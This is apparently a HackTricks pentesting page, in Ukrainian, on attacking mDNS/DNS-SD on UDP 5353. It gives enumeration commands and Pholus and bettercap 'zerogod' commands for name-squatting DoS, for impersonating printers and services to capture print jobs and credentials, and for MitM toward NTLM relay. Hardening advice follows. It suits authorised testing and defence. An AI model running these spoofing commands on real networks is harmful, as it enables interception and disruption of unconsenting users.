# 5353/UDP Multicast DNS (mDNS) та DNS-SD

{{#include ../banners/hacktricks-training.md}}

## Основна інформація

Multicast DNS (mDNS) забезпечує DNS-подібне розв'язання імен та виявлення сервісів в межах локальної мережі без унікаст DNS-сервера. Використовує UDP/5353 та мультикаст-адреси 224.0.0.251 (IPv4) та FF02::FB (IPv6). DNS Service Discovery (DNS-SD, зазвичай використовується разом з mDNS) забезпечує стандартизований спосіб переліку та опису сервісів через записи PTR, SRV та TXT.
```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Ключові деталі протоколу, які ви часто використовуватимете під час атак:
- Імена в зоні .local вирішуються через mDNS.
- Біт QU (Query Unicast) може вимагати unicast-відповідей навіть для multicast-запитів.
- Реалізації повинні ігнорувати пакети, які не походять з локального лінку; деякі стеки все ще їх приймають.
- Probing/announcing забезпечує унікальність імен хоста/сервісу; втручання тут створює умови DoS/“name squatting”.

## DNS-SD модель сервісів

Сервіси ідентифікуються як _<service>._tcp або _<service>._udp в зоні .local, наприклад _ipp._tcp.local (принтери), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge) тощо. Знаходьте типи за допомогою _services._dns-sd._udp.local, потім розв'язуйте знайдені екземпляри до SRV/TXT/A/AAAA.

## Дослідження мережі та перерахування

- nmap сканування цілі (прямий mDNS на хості):
```bash
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- nmap пошук по широкомовленню (прослуховування сегмента та перерахунок усіх типів/екземплярів DNS-SD):
```bash
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux):
```bash
# List service types
avahi-browse -bt _services._dns-sd._udp
# Browse all services and resolve to host/port
avahi-browse -art
```
- Apple dns-sd (macOS):
```bash
# Browse all HTTP services
dns-sd -B _http._tcp
# Enumerate service types
dns-sd -B _services._dns-sd._udp
# Resolve a specific instance to SRV/TXT
dns-sd -L "My Printer" _ipp._tcp local
```
- Захоплення пакетів за допомогою tshark:
```bash
# Live capture
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Порада: Деякі браузери/WebRTC використовують тимчасові mDNS-хостнейми, щоб маскувати локальні IP. Якщо у трафіку ви бачите випадкові random-UUID.local кандидати, розв'язуйте їх через mDNS, щоб переключитися на локальні IP.

## Attacks

### Втручання в перевірку імен mDNS (DoS / name squatting)

Під час фази probing хост перевіряє унікальність імені. Відповідь зі спуфованими конфліктами змушує його обрати нові імена або зазнати невдачі. Це може затримати або запобігти реєстрації та виявленню сервісу.

Example with Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### Підробка сервісів і імітація особи (MitM)

Імітуйте анонсовані DNS-SD служби (принтери, AirPlay, HTTP, спільні файлові ресурси), щоб примусити клієнтів підключитися до вас. Це особливо корисно для:
- Перехоплювати документи, здійснюючи spoofing _ipp._tcp або _printer._tcp.
- Заманювати клієнтів на HTTP/HTTPS сервіси, щоб зібрати tokens/cookies або доставити payloads.
- Комбінувати з NTLM relay techniques, коли Windows-клієнти ведуть переговори про автентифікацію з spoofed services.

За допомогою bettercap’s zerogod module (mDNS/DNS-SD spoofer/impersonator):
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42
# Show full DNS records for a host (newer bettercap)
> zerogod.show-full 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Також див. generic LLMNR/NBNS/mDNS/WPAD spoofing та робочі процеси перехоплення/ретрансляції облікових даних:

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Примітки щодо нещодавніх проблем реалізації (корисно для DoS/утримання доступу під час тестувань)

- Avahi reachable-assertion та помилки аварійного завершення D-Bus (2023) можуть зупинити avahi-daemon у дистрибутивах Linux (наприклад CVE-2023-38469..38473, CVE-2023-1981), порушуючи service discovery на цільових хостах до перезапуску.
- Cisco IOS XE Wireless LAN Controller mDNS gateway DoS (CVE-2024-20303) дозволяє суміжним WLAN-клієнтам штовхати сконструйовані mDNS, що підвищує навантаження на CPU WLC і обриває AP тунелі — корисно, якщо потрібно змусити клієнта перейти на інший AP або викликати перезапуск контролера під час тестування.
- Apple mDNSResponder logic error DoS (CVE-2024-44183) дозволяє sandboxed локальному процесу аварійно завершити Bonjour та тимчасово пригальмувати публікацію/пошук сервісів на Apple-ендпойнтах; виправлено в поточних версіях iOS/macOS.
- Apple mDNSResponder correctness issue (CVE-2025-31222) дозволяла локальне підвищення привілеїв через mDNSResponder; корисно для утримання доступу на некерованих Mac/iPhone, виправлено в останніх оновленнях iOS/macOS.

### Розгляд Browser/WebRTC mDNS

Сучасні Chromium/Firefox обфускують host candidates випадковими mDNS-іменами. Ви можете повторно відкрити LAN IP на керованих кінцевих точках, застосувавши політику Chrome `WebRtcLocalIpsAllowedUrls` (або переключивши `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns`/аналог у Edge), щоб ICE показував host candidates замість mDNS; задається через `HKLM\Software\Policies\Google\Chrome`.

Коли користувачі відключають захист вручну (часто в інструкціях із усунення неполадок WebRTC), їхні браузери знову починають рекламувати прості host candidates, які ви можете перехопити через mDNS або ICE signaling для прискорення виявлення хостів.

## Захисні міркування та OPSEC

- Межі сегментів: не маршрутизовуйте 224.0.0.251/FF02::FB між зон безпеки, якщо явно не потрібен mDNS gateway. Якщо потрібно мостити discovery, віддавайте перевагу allowlists та обмеженням швидкості.
- Windows endpoints/servers:
- Щоб жорстко відключити розв'язування імен через mDNS, встановіть значення реєстру і перезавантажте:
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
- У керованих середовищах відключіть вбудоване правило Windows Defender Firewall “mDNS (UDP-In)” (принаймні для Domain профілю), щоб запобігти обробці вхідних mDNS, одночасно зберігаючи функціональність для home/roaming.
- У новіших збірках Windows 11/GPO темплейтах використовуйте політику “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” і встановіть її в Disabled.
- Linux (Avahi):
- Обмежте публікацію, коли вона не потрібна: встановіть `disable-publishing=yes`, і обмежте інтерфейси через `allow-interfaces=` / `deny-interfaces=` в `/etc/avahi/avahi-daemon.conf`.
- Розгляньте `check-response-ttl=yes` і уникайте `enable-reflector=yes`, якщо це не суворо необхідно; при віддзеркаленні віддавайте перевагу allowlists через `reflect-filters=`.
- macOS: Обмежуйте вхідний mDNS на хості/мережевих фаєрволах, коли Bonjour discovery не потрібен для певних підмереж.
- Моніторинг: Налаштуйте сповіщення про незвичні сплески запитів `_services._dns-sd._udp.local` або раптові зміни в SRV/TXT критичних сервісів; це індикатори spoofing або підробки сервісів.

## Швидкий довідник по інструментах

- nmap NSE: `dns-service-discovery` і `broadcast-dns-service-discovery`.
- Pholus: активне сканування, reverse mDNS sweeps, DoS і допоміжні інструменти для spoofing.
```bash
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).

## Spoofing/MitM

Найцікавіша атака, яку можна виконати через цей сервіс — це організувати MitM в зв'язку між клієнтом і справжнім сервером. Ви можете отримати конфіденційні файли (MitM комунікації з принтером) або навіть облікові дані (Windows authentication).\
Для додаткової інформації див.:


{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## References

- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)
- [Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
- [Rapid7 advisory for Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
- [Rapid7 writeup of Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)

{{#include ../banners/hacktricks-training.md}}
